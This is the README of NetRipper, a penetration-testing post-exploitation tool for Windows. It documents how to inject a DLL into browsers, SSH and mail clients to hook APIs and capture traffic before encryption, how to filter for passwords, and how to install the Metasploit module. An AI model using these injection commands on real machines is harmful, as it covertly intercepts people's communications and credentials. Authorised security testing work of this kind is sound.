# Description

NetRipper is a post exploitation tool targeting Windows systems which uses API hooking in order to intercept network traffic and encryption related functions from a low privileged user, being able to capture both plain-text traffic and encrypted traffic before encryption/after decryption. 

NetRipper was released at Defcon 23, Las Vegas, Nevada.

# Abstract

The post-exploitation activities in a penetration test can be challenging if the tester has low-privileges on a fully patched, well configured Windows machine. This work presents a technique for helping the tester to find useful information by sniffing network traffic of the applications on the compromised machine, despite his low-privileged rights. Furthermore, the encrypted traffic is also captured before being sent to the encryption layer, thus all traffic (clear-text and encrypted) can be sniffed. The implementation of this technique is a tool called NetRipper which uses API hooking to do the actions mentioned above and which has been especially designed to be used in penetration tests, but the concept can also be used to monitor network traffic of employees or to analyze a malicious application.

# Tested applications

NetRipper should be able to capture network traffic from: Putty, WinSCP, SQL Server Management Studio, Lync (Skype for Business), Microsoft Outlook, Google Chrome, Mozilla Firefox. The list is not limited to these applications but other tools may require special support.

# Components

```
NetRipper.exe - Configures and inject the DLL  
DLL.dll       - Injected DLL, hook APIs and save data to files  
netripper.rb  - Metasploit post-exploitation module
```

# Command line

```
Injection: NetRipper.exe DLLpath.dll processname.exe  
Example:   NetRipper.exe DLL.dll firefox.exe  

Generate DLL:

  -h,  --help          Print this help message  
  -w,  --write         Full path for the DLL to write the configuration data  
  -l,  --location      Full path where to save data files (default TEMP)  

Plugins:

  -p,  --plaintext     Capture only plain-text data. E.g. true  
  -d,  --datalimit     Limit capture size per request. E.g. 4096  
  -s,  --stringfinder  Find specific strings. E.g. user,pass,config  

Example: NetRipper.exe -w DLL.dll -l TEMP -p true -d 4096 -s user,pass  
```

# Metasploit module

```
msf > use post/windows/gather/netripper 
msf post(netripper) > show options

Module options (post/windows/gather/netripper):

   Name          Current Setting                  Required  Description
   ----          ---------------                  --------  -----------
   DATALIMIT     4096                             no        The number of bytes to save from requests/responses
   DATAPATH      TEMP                             no        Where to save files. E.g. C:\Windows\Temp or TEMP
   PLAINTEXT     true                             no        True to save only plain-text data
   PROCESSIDS                                     no        Process IDs. E.g. 1244,1256
   PROCESSNAMES                                   no        Process names. E.g. firefox.exe,chrome.exe
   SESSION                                        yes       The session to run this module on.
   STRINGFINDER  user,login,pass,database,config  no        Search for specific strings in captured data
```

# Metasploit installation (Kali)

1. cp netripper.rb /usr/share/metasploit-framework/modules/post/windows/gather/netripper.rb
2. mkdir /usr/share/metasploit-framework/modules/post/windows/gather/netripper
3. g++ -Wall netripper.cpp -o netripper
4. cp netripper /usr/share/metasploit-framework/modules/post/windows/gather/netripper/netripper
5. cd ../Release
6. cp DLL.dll /usr/share/metasploit-framework/modules/post/windows/gather/netripper/DLL.dll

# Plugins

1. PlainText - Allows to capture only plain-text data
2. DataLimit - Save only first bytes of requests and responses
3. Stringinder - Find specific string in network traffic

# To do

- Support multiple applications
- Support for x64 processes
- Thread-safe API hooking
- Monitor loading of DLLs and new processes

Any suggestion is appreciated!

# Author

Ionut Popescu, Senior Security Consultant at KPMG Romania
